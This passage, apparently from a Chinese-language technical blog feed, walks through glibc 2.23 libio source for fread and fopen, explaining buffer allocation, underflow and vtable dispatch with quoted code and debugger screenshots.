class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def(_IO_setb)</span><br></pre></td></tr></table></figure><p>如果f的_IO_buf_base存在，而且标志位的_IO_USER_BUF不是用户分配缓冲区，释放这个缓冲区</p><p>设置_IO_buf_base为刚刚malloc的堆为缓冲区，_IO_buf_end设置为堆块开始+堆块大小，并设置_flags为用户分配缓冲区</p><blockquote><p>#define _IO_USER_BUF 1 &#x2F;* User owns buffer; don’t delete it on close. *&#x2F;</p><p>_IO_USER_BUF用于指示文件流的缓冲区是由用户分配的还是由标准 I&#x2F;O 库分配的。如果 <code>_IO_USER_BUF</code> 标志位未被设置，那么表示文件流的缓冲区是由标准 I&#x2F;O 库分配的。在这种情况下，标准 I&#x2F;O 库会在关闭文件流时自动释放缓冲区。如果 <code>_IO_USER_BUF</code> 标志位被设置，那么表示文件流的缓冲区是由用户分配的。在这种情况下，标准 I&#x2F;O 库不会尝试释放缓冲区 </p></blockquote><hr><h2 id="往缓冲区里写入流指针所标记的文件数据，并把数据写入目标内存"><a href="#往缓冲区里写入流指针所标记的文件数据，并把数据写入目标内存" class="headerlink" title="往缓冲区里写入流指针所标记的文件数据，并把数据写入目标内存"></a>往缓冲区里写入流指针所标记的文件数据，并把数据写入目标内存</h2><p>回到_IO_file_xsgetn然后进行我们fread函数的第三个参数count次的循环</p><p>前面条件都不符合来到<code> if (fp-&gt;_IO_buf_base&amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</code></p><h4 id="want-lt-size-t-fp-gt-IO-buf-end-fp-gt-IO-buf-base-时-即fread一次想要读取的数据小于4k"><a href="#want-lt-size-t-fp-gt-IO-buf-end-fp-gt-IO-buf-base-时-即fread一次想要读取的数据小于4k" class="headerlink" title="want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)时,即fread一次想要读取的数据小于4k"></a><strong>want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)时,即fread一次想要读取的数据小于4k</strong></h4><p>调用<strong>libio&#x2F;genops.c</strong> __underflow</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">-1</span>) != <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_get_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (_IO_have_markers (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_end))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp);</span><br><span class="line">  <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__underflow)</span><br></pre></td></tr></table></figure><p><code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>检测缓冲区是否有数据，有数据可以直接返回读取</p><p>否则调用_IO_UNDERFLOW</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNDERFLOW(FP) JUMP0 (__underflow, FP)</span></span><br></pre></td></tr></table></figure><p><mark><strong>即虚表中的__underflow字段，对应_IO_new_file_underflow函数</strong><mark></mark></mark></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_new_file_underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="comment">/* SysV does not make this test; take it out for compatibility */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> (EOF);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)<span class="comment">//会先检测是否存在_IO_NO_READS标志，</span></span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)<span class="comment">//检测输入缓冲区里存在数据</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">      _IO_doallocbuf (fp);<span class="comment">//如果没有输入缓冲区，则再次调用_IO_doallocbuf分配输入缓冲区</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flush all line buffered files before reading. */</span></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">      _IO_flush_all_linebuffered ();</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment">     required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment">     traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment">     not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment">     explicitly.  --drepper */</span></span><br><span class="line">      _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">      == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">    _IO_OVERFLOW (_IO_stdout, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (_IO_stdout);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line"><span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment">     handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment">     unset it.  */</span></span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会先检测是否存在_IO_NO_READS标志，输入缓冲区里存在数据</p><p>如果没有输入缓冲区，则再次调用_IO_doallocbuf分配输入缓冲区</p><p>设置_IO_read_base，_IO_read_ptr，_IO_read_end，_IO_write_base，_IO_write_ptr，_IO_write_end都为filedoalloc.c中申请的堆的缓冲区</p><img src="/2023/03/31/IO-FILE-fread/image-20230331225339043.png" alt="image-20230331225339043" style="zoom:67%;"><p>调用**_IO_SYSREAD<strong>函数尝试从</strong>fp<strong>中读</strong>_IO_buf_end - _IO_buf_base**数据到_IO_buf_base</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SYSREAD(FP, DATA, LEN) JUMP2 (__read, FP, DATA, LEN)</span></span><br></pre></td></tr></table></figure><p><mark><strong>_IO_SYSREAD 调用虚表里的_&#x2F;read指向的libio&#x2F;fileops.c的_IO_file_read</strong><mark></mark></mark></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_file_read (_IO_FILE *fp, <span class="type">void</span> *buf, _IO_ssize_t size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (__builtin_expect (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL, <span class="number">0</span>)</span><br><span class="line">      ? read_not_cancel (fp-&gt;_fileno, buf, size)</span><br><span class="line">      : read (fp-&gt;_fileno, buf, size));</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_read)</span><br></pre></td></tr></table></figure><p><img src="/2023/03/31/IO-FILE-fread/image-20230331230514508.png" alt="image-20230331230514508"></p><p>把文件描述符_fileno代表的文件数据读入到_IO_buf_base</p><p><img src="/2023/03/31/IO-FILE-fread/image-20230331230607785.png" alt="image-20230331230607785"></p><p>移动_IO_read_end位置,来标记读入数据的终点</p><img src="/2023/03/31/IO-FILE-fread/image-20230331231456814.png" alt="image-20230331231456814" style="zoom:67%;"><p>再次回到_IO_file_xsgetn的while循环</p><p>这次会进入第一条分支</p><p><img src="/2023/03/31/IO-FILE-fread/image-20230331232055813.png" alt="image-20230331232055813"></p><p>通过memcpy拷贝内存到fopen函数的第一个参数buffer</p><p><img src="/2023/03/31/IO-FILE-fread/image-20230331232240158.png" alt="image-20230331232240158"></p><p>改变_IO_read_ptr指向区域</p><p><img src="/2023/03/31/IO-FILE-fread/image-20230331232540181.png" alt="image-20230331232540181"></p><p>一直循环到count为0</p><h4 id="want-gt-size-t-fp-gt-IO-buf-end-fp-gt-IO-buf-base）时，即fread一次想要读取的数据大于4k"><a href="#want-gt-size-t-fp-gt-IO-buf-end-fp-gt-IO-buf-base）时，即fread一次想要读取的数据大于4k" class="headerlink" title="want &gt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base）时，即fread一次想要读取的数据大于4k"></a>want &gt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base）时，即fread一次想要读取的数据大于4k</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">_IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">count = want;</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">&#123;</span><br><span class="line">    _IO_size_t block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">    <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">        count -= want % block_size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">count = _IO_SYSREAD (fp, s, count);</span><br><span class="line"><span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">        fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s += count;</span><br><span class="line">want -= count;</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br></pre></td></tr></table></figure><p><strong>libio&#x2F;libioP.h</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_setg(fp, eb, g, eg)  ((fp)-&gt;_IO_read_base = (eb),\</span></span><br><span class="line"><span class="meta">    (fp)-&gt;_IO_read_ptr = (g), (fp)-&gt;_IO_read_end = (eg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_setp(__fp, __p, __ep) \</span></span><br><span class="line"><span class="meta">       ((__fp)-&gt;_IO_write_base = (__fp)-&gt;_IO_write_ptr \</span></span><br><span class="line"><span class="meta">    = __p, (__fp)-&gt;_IO_write_end = (__ep))</span></span><br></pre></td></tr></table></figure><p>macro展开是这样的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">((fp)-&gt;_IO_read_base = (fp-&gt;_IO_buf_base), (fp)-&gt;_IO_read_ptr = (fp-&gt;_IO_buf_base), (fp)-&gt;_IO_read_end = (fp-&gt;_IO_buf_base));</span><br><span class="line">((fp)-&gt;_IO_write_base = (fp)-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base, (fp)-&gt;_IO_write_end = (fp-&gt;_IO_buf_base));</span><br></pre></td></tr></table></figure><p>也是把结构体里的<strong>read</strong>和<strong>write</strong>相关<strong>6</strong>个指针均初始化为**_IO_buf_base**</p><p>因为此时申请的缓冲区最大，一个页面4k，所以block_size为4k，调用_IO_SYSREAD，这一次不经过缓冲区，直接把数据放入我们fopen指定的第一个参数里，s +&#x3D; count;<br>want -&#x3D; count;后，最后如果大小小于4k会和上面小于4k一样先进入缓冲区再读入第一个参数内存里</p><h2 id="函数中调用的vtable函数"><a href="#函数中调用的vtable函数" class="headerlink" title="函数中调用的vtable函数"></a>函数中调用的vtable函数</h2><ul><li><code>_IO_sgetn</code>函数调用了vtable的<code>_IO_file_xsgetn</code>。</li><li><code>_IO_doallocbuf</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。</li><li>vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。</li><li><code>__underflow</code>函数调用了vtable中的<code>_IO_new_file_underflow</code>实现文件数据读取。</li><li>vtable中的<code>_IO_new_file_underflow</code>调用了vtable<code>__GI__IO_file_read</code>最终去执行系统调用read。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> IO FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO FILE fopen</title>
      <link href="/2023/03/30/IO-FILE-fopen/"/>
      <url>/2023/03/30/IO-FILE-fopen/</url>
      
        <content type="html"><![CDATA[<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>glibc2.23</p><p>下载对应版本Ubuntu glibc源码 <a href="https://launchpad.net/ubuntu/+source/glibc/">https://launchpad.net/ubuntu/+source/glibc/</a></p><p>或者</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo apt-get install glibc-source</span><br><span class="line">sudo apt-get install libc6-dbg</span><br><span class="line">sudo apt-get install libc6-dbg:i386</span><br><span class="line">到/usr/src/glibc</span><br></pre></td></tr></table></figure><p>在.gdbinit里写入dir path进行源码级调试,也可以直接在gdb里dir path</p><h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *<span class="title function_">fopen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span></span><br></pre></td></tr></table></figure><p><strong>&#x2F;include&#x2F;stdio.h</strong></p><p>找到了fopen的macro</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#   <span class="keyword">define</span> fopen(fname, mode) _IO_new_fopen (fname, mode)</span></span><br></pre></td></tr></table></figure><p><strong>&#x2F;libio&#x2F;iofopen.c</strong></p><p>_IO_new_fopen直接调用__fopen_internal</p><p><strong>_IO_new_fopen</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_new_fopen (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __fopen_internal (filename, mode, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>__fopen_internal</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">__fopen_internal (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode, <span class="type">int</span> is32)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;          <span class="comment">//为多线程(Multithreading)io安全准备的锁</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (<span class="keyword">struct</span> locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (<span class="keyword">struct</span> locked_FILE));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">1</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">  _IO_file_init (&amp;new_f-&gt;fp);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span>  !_IO_UNIFIED_JUMPTABLES</span></span><br><span class="line">  new_f-&gt;fp.vtable = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="built_in">free</span> (new_f);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>先用malloc分配了locked_FILE类型的结构体new_f</li><li><code>_IO_no_init</code>进行初始化 _IO_FILE_plus fp</li><li><code>_IO_file_init</code>将结构体链接进<code>_IO_list_all</code>链表</li><li><code>_IO_file_fopen</code>执行系统调用打开文件</li></ol><h3 id="IO-no-init进行初始化-IO-FILE-plus-fp"><a href="#IO-no-init进行初始化-IO-FILE-plus-fp" class="headerlink" title="_IO_no_init进行初始化 _IO_FILE_plus fp"></a><code>_IO_no_init</code>进行初始化 _IO_FILE_plus fp</h3><p><strong>_IO_no_init</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_no_init (_IO_FILE *fp, <span class="type">int</span> flags, <span class="type">int</span> orientation,</span><br><span class="line">         <span class="keyword">struct</span> _IO_wide_data *wd, <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *jmp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_old_init (fp, flags);</span><br><span class="line">  fp-&gt;_mode = orientation;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="keyword">if</span> (orientation &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_wide_data = wd;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_wide_vtable = jmp;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* Cause predictable crash when a wide function is called on a byte</span></span><br><span class="line"><span class="comment">       stream.  */</span></span><br><span class="line">    fp-&gt;_wide_data = (<span class="keyword">struct</span> _IO_wide_data *) <span class="number">-1L</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  fp-&gt;_freeres_list = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先调用_IO_old_init 设置flags，其余NULL初始化fp</p><p><strong>_IO_old_init</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_old_init (_IO_FILE *fp, <span class="type">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">  fp-&gt;_flags = _IO_MAGIC|flags;</span><br><span class="line">  fp-&gt;_flags2 = <span class="number">0</span>;</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_chain = <span class="literal">NULL</span>; <span class="comment">/* Not necessary. */</span></span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_markers = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_cur_column = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _IO_JUMPS_OFFSET</span></span><br><span class="line">  fp-&gt;_vtable_offset = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_init (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</code></p><p>再把<code>_wide_data</code>字段赋值并初始化fp-&gt;_wide_data-&gt;_wide_vtabl为_IO_wfile_jumps</p><p><img src="/2023/03/30/IO-FILE-fopen/image-20230330202938679.png" alt="image-20230330202938679"></p><h3 id="IO-file-init将结构体链接进-IO-list-all链表"><a href="#IO-file-init将结构体链接进-IO-list-all链表" class="headerlink" title="_IO_file_init将结构体链接进_IO_list_all链表"></a><code>_IO_file_init</code>将结构体链接进<code>_IO_list_all</code>链表</h3><p>回到<code>__fopen_internal</code>先执行<code>_IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS(*THIS*) (THIS)-&gt;vtable</span></span><br></pre></td></tr></table></figure><blockquote><p><code>*THIS*</code> 是一个指针参数，它用来表示传入宏定义的结构体指针。</p><p>在宏定义展开时，参数 <code>THIS</code> 会被替换为传入的结构体指针。而 <code>*THIS*</code> 中的星号 <code>*</code> 没有实际的作用，只是为了标识 <code>THIS</code> 是一个指针类型的参数。这样做的目的是为了方便理解宏定义的作用，明确参数类型，增加代码的可读性。</p></blockquote><p>把fp的vtable设置为_IO_file_jumps地址</p><p><strong>&#x2F;libio&#x2F;fileops.c</strong> </p><p><strong>_IO_new_file_init</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_file_init _IO_file_init</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_init (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* POSIX.1 allows another file handle to be used to change the position</span></span><br><span class="line"><span class="comment">     of our file descriptor.  